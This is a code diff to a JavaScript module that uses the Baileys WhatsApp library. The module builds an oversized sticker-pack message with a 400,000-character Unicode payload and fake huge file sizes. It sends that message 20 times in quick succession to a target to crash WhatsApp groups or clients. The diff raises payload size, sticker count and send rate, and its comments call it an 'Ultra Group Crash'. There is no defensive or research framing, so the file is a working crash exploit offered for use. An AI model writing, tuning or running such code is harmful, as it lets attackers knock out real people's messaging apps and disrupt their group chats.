@@ -1,6 +1,7 @@
 
-const { generateWAMessageFromContent, delay } = require('@whiskeysockets/baileys');
+const { delay } = require('@whiskeysockets/baileys');
 const { getSuperPayload } = require('./SuperPayload');
+const { sendRawBug } = require('./RawSender');
 
 function createSticker(fileName) {
   return {
@@ -15,23 +16,22 @@ function createSticker(fileName) {
 
 async function SuperGroupBug(SYxS7, target) {
     try {
-        // Optimized payload size to 250,000 characters for stability
-        // 1M was causing 'Reason: 500' connection drops
-        const superSpam = getSuperPayload(250000); 
-        const stickers = Array(20).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
+        // High-intensity payload: 400k characters of heavy Unicode
+        const superSpam = getSuperPayload(400000); 
+        const stickers = Array(40).fill(createSticker("FlMx-HjycYUqguf2rn67DhDY1X5ZIDMaxjTkqVafOt8=.webp"));
         
-        const payload = {
+        const messageContent = {
             stickerPackMessage: {
                 stickerPackId: "ROBIN-ULTRA-BUG",
                 name: superSpam,
                 publisher: "KING ROBIN",
                 packDescription: superSpam,
                 stickers: stickers,
-                fileLength: "999999999",
-                stickerPackSize: "999999999",
+                fileLength: "999999999999",
+                stickerPackSize: "999999999999",
                 contextInfo: {
                     externalAdReply: {
-                        title: "💀 ULTRA GROUP DESTROYER 💀",
+                        title: "💀 ULTRA BYPASS 💀",
                         body: superSpam,
                         showAdAttribution: true,
                         renderLargerThumbnail: true,
@@ -50,19 +50,14 @@ async function SuperGroupBug(SYxS7, target) {
             }
         };
 
-        // Repeatedly send the optimized super message
-        for (let i = 0; i < 12; i++) {
-            try {
-                await SYxS7.relayMessage(target, payload, {
-                    participant: { jid: target }
-                });
-                await delay(400); // Slightly increased delay for stability
-            } catch (e) {
-                console.log("Relay attempt failed, skipping...");
-            }
+        // Aggressive Raw Stanza Flood
+        console.log(`Executing Ultra Group Crash on ${target}...`);
+        for (let i = 0; i < 20; i++) {
+            await sendRawBug(SYxS7, target, messageContent);
+            await delay(200); // High speed repetition
         }
     } catch (error) {
-        console.error("SuperGroupBug optimized failed:", error.message);
+        console.error("SuperGroupBug failed:", error.message);
     }
 }
 
